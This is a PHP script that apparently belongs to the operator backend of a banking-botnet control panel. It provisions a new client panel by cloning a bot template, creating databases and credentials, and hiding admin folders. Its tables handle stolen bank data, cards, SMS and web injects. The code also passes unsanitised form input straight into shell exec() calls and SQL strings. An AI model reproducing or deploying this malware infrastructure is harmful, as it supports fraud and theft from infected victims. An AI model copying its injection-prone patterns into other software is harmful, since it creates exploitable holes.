<?php
include("lib.php");
include("config.php");
include("pdo.php");

$new_video = str_replace('%', '', password(20));
$new_stats = str_replace('%', '', password(20));

if($_POST)
{
	if(!isset($_POST['mods']))
		$_POST['mods'] = array();

	$id = $_POST['id'];
	$name = $_POST['name'];
	if(!$name)
	{
		echo html_msg("Name cannot be empty", "error");
		echo html_back();
		return;
	}
	$jabber = $_POST['jabber'];
	if(!$jabber)
	{
		echo html_msg("Jabber cannot be empty", "error");
		echo html_back();
		return;
	}
	
	$mods = '';
	$folder = $_POST['folder'];
	$basic_login = strtolower($folder);
	$basic_pass = $_POST['basic_pass'];
	$salt = password(20);
	$admin_pass = $_POST['admin_pass'];
	$admin_pass_hash = md5($admin_pass . $salt);
	$db_pass = $_POST['db_pass'];
	$db_user = strtolower($folder);

	
	## connect to mysql as root
	$db_root = new Db();
	$res = $db_root->connect('general', $_DB['user'], $_DB['password']);
	if(!$res)
	{
		echo html_msg("Can't connect to db as root", "error");
		echo html_back();
		return;
	}

	$db_name = "bot_" . strtolower($folder);
	$data = $db_root->exec("SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA WHERE SCHEMA_NAME = '{$db_name}'", null, true);
	if($data)
	{
		echo html_msg("Database {$db_name} already exists", "error");
		echo html_back();
		return;
	}
	
	# CURRENT DIR: www/cp/
	$cp_dir = getcwd();
	chdir("../../clients");
	//~ chdir("/var/www/cp_test/www/clients");
	mkdir($folder);
	exec("cp -rp blank/bot/ {$folder}/");
	
	chdir("../bot/");
	exec("ln -s ../clients/{$folder}/bot {$folder}");
	
	chdir($folder);

	exec("mv config.php.tpl config.php");
	exec("mv index.php.tpl index.php");
	exec("mv admin123/index.php.tpl admin123/index.php");
	exec("mv stats456/index.php.tpl stats456/index.php");
	
	file_replace('config.php', '%UID%', $id);
	file_replace('config.php', '%DB_USER%', $db_user);
	file_replace('config.php', '%DB_NAME%', $db_name);
	file_replace('config.php', '%DB_PASS%', $db_pass);
	file_replace('config.php', '%SALT%', $salt);
	file_replace('config.php', '%GUEST_URL%', $new_stats);
	file_replace('config.php', '%CLIENT%', $name);
	
	file_replace('admin123/.htaccess', '%USER%', $db_user);
	
	$config_new = "config_" . str_replace('%', '', password(20)) . ".php";
	exec("mv config.php {$config_new}");
	
	if(file_exists('/var/www/git')) # disable basic on localhost
		exec("mv admin123/.htaccess admin123/_.htaccess");
		
	file_replace('index.php', 'config.php', $config_new);
	file_replace('admin123/index.php', 'config.php', $config_new);
	file_replace('stats456/index.php', 'config.php', $config_new);
	
	exec("mv admin123 {$new_video}");
	exec("mv stats456 {$new_stats}");
	
	# go to www/
	chdir("../../../");
	# add basic user
	$cmd = "htpasswd -b ../customers.passwd {$basic_login} {$basic_pass}";
	exec($cmd, $out);
	$basic_auth = "{$basic_login}:{$basic_pass}";
	
	//~ $db_root->exec("DROP USER {$db_user}");
	$db_root->exec("CREATE USER '{$db_user}'@'%' IDENTIFIED BY '{$db_pass}'");
	$db_root->exec("GRANT USAGE ON {$db_name} . * TO '{$db_user}'@'%' IDENTIFIED BY '{$db_pass}' WITH MAX_QUERIES_PER_HOUR 0 MAX_CONNECTIONS_PER_HOUR 0 MAX_UPDATES_PER_HOUR 0 MAX_USER_CONNECTIONS 0");
	$db_root->exec("CREATE DATABASE IF NOT EXISTS `{$db_name}`");

	chdir($cp_dir); // back to cp/
	
	# fill new db 
	$esc_user = escapeshellcmd($_DB['user']);
	$esc_pass = escapeshellcmd($_DB['password']);
	$cmd = "mysqldump -u{$esc_user} -p{$esc_pass} blank_bot | mysql -u{$esc_user} -p{$esc_pass} {$db_name}";
	//~ echo $cmd;
	exec($cmd, $out);

	$db_root->exec("GRANT ALL PRIVILEGES ON `{$db_name}` . * TO '{$db_user}'@'%'");
	$db_root->exec("GRANT SELECT, INSERT, UPDATE, DELETE ON `general`.* TO '{$db_user}'@'%'");

	## connect to mysql as user
	$db_client = new Db();

	$res = $db_client->connect($db_name, $db_user, $db_pass);
	if(!$res)
	{
		echo html_msg("Can't connect to db as user {$db_user}", "error");
		echo html_back();
		return;
	}
	
	$db_client->exec("delete from apps");
	$db_client->exec("delete from bots");
	$db_client->exec("delete from bot_apps");
	$db_client->exec("delete from bot_banks");
	$db_client->exec("delete from bot_cards");
	$db_client->exec("delete from bot_contacts");
	$db_client->exec("delete from bot_sms");
	$db_client->exec("delete from bot_tasks");
	$db_client->exec("delete from injects");
	$db_client->exec("delete from users");
	
	$db_client->exec("update config set value='{$folder}' where name like('folder')");

	$sql = "update config set value='' where name in('wanted_apps_list', 
	'cc_on_apps_list', 'minimize_apps_list', 'domains_list', 'last_login', 'mass_sms_urls_list');";
	$db_client->exec($sql);

	$sql = "update config set value='1' where name in('data_version');";
	$db_client->exec($sql);

	$sql = "update config set value='0' where name like('mod_%');";
	$db_client->exec($sql);

	foreach($_POST['mods'] as $mod_name=>$val)
	{
		$db_client->exec("update config set value='1' where name='mod_{$mod_name}'");
		$mods .= "{$mod_name};";
	}
	
	$mods = substr($mods, 0, strlen($mods)-1);
	
	$sql = "update config set value='' where name like('jabber_%');";
	$db_client->exec($sql);

	$sql = "update config set value='0' where name like('jabber_on_%');";
	$db_client->exec($sql);

	$sql = "INSERT INTO users values(null, 'admin', '{$admin_pass_hash}', '', 'active')";
	$db_client->exec($sql);
	
	$sql = <<<PHP
CREATE FUNCTION {$db_name}.`is_online`(`tm` TIMESTAMP)
RETURNS tinyint(4)
NO SQL
DETERMINISTIC
BEGIN
DECLARE res TINYINT;
IF `tm` > date_sub(now(), interval 24 hour) THEN SET res = 1;
ELSE SET res = 0;
END IF;
RETURN res;
END
PHP;
	$db_client->exec($sql);

	$code = "";
	
	$html = html_msg("Panel added. Don't forget to setup client's frontend server");
	
	$info = <<<PHP
ID: {$id}
Client: {$name}
Jabber: {$jabber}
Folder: {$folder}
Basic: {$basic_auth}
Admin: admin:{$admin_pass}
DB: {$db_name} {$db_user}:{$db_pass}
PANEL_FOLDER: {$new_video}
STATS_FOLDER: {$new_stats}
MODS: {$mods}
PHP;

	$html .= <<<PHP
<div class="box grid_6">
	
	<div class="box-head"><h2>New bot panel credentials</h2></div>

	<div class="box-content">
		<div class="form-row">
			<div class="form-item"><textarea onclick='this.select()' style='width: 100%; height: 200px'>{$info}</textarea></div>
		</div>
	</div>
</div>
PHP;
	#$html .= "<div class='form-row' style='text-align: center'><input type='text' style='width: 50%' onclick='this.select()' value='{$code}' /></div>";
	$html .= html_back();
	echo $html;
	return;
}

$data = file_get_contents("tpls/{$action}.html");

$new_id = get_new_id("../../clients/*/bot/");
$folder = generate_folder();

$data = str_replace('%FOLDER%', $folder, $data); 
$data = str_replace('%ID%', $new_id, $data); 
$data = str_replace('%DB_PASS%', password(20), $data); 
$data = str_replace('%BASIC_PASS%', password(20), $data); 
$data = str_replace('%ADMIN_PASS%', password(20), $data); 

echo $data;









